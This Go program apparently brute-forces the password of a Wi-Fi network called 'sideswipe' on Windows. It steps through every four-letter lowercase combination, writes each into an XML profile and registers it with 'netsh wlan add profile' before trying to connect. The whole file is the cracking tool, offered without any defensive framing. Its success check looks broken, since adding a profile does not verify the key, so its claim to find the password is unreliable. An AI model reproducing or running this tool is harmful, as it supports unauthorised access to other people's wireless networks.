package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
)

var arr = [...]string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
	"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}

func main() {
	start := time.Now()

	name := "sideswipe"
	initalize(name)
	found, passed := tryPws(name)
	fmt.Println(found, passed, time.Since(start))
	connectToNetwork(name)
}

func tryPws(name string) (string, bool) {
	previous := "{password}"
	for i := 0; i < len(arr); i++ {
		for j := 0; j < len(arr); j++ {
			for ii := 0; ii < len(arr); ii++ {
				for jj := 0; jj < len(arr); jj++ {
					pw := arr[i] + arr[j] + arr[ii] + arr[jj]
					if loginToNetwork(name, pw, previous) {
						return pw, true
					}
					previous = pw
				}
			}
		}
	}
	return "", false
}
func initalize(name string) error {
	data, err := ioutil.ReadFile("template.xml")
	must(err)
	str := string(data)
	str = strings.Replace(str, "{SSID}", name, 2)

	f, err := os.Create("profile.xml")
	must(err)
	f.Write([]byte(str))
	f.Close()
	return nil
}

func loginToNetwork(name, pass, prev string) bool {
	createFileProfile(name, pass, prev)
	err := addProfile()
	return err == nil
}
func addProfile() error {
	dir, _ := os.Getwd()
	file := fmt.Sprintf("filename=%s\\profile.xml", dir)
	_, err := exec.Command(`netsh`, `wlan`, `add`, `profile`, file, `interface="WI-FI"`, `user=current`).Output()
	return err
}

func createFileProfile(name, pass, prev string) {
	data, err := ioutil.ReadFile("profile.xml")
	must(err)
	str := string(data)
	str = strings.Replace(str, prev, pass, 1)
	os.WriteFile("profile.xml", []byte(str), 0644)
}

func connectToNetwork(name string) bool {
	str := fmt.Sprintf("name=%s", name)
	out, err := exec.Command("netsh", "wlan", "connect", str).Output()
	must(err)
	fmt.Print(string(out))
	return false
}

func must(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
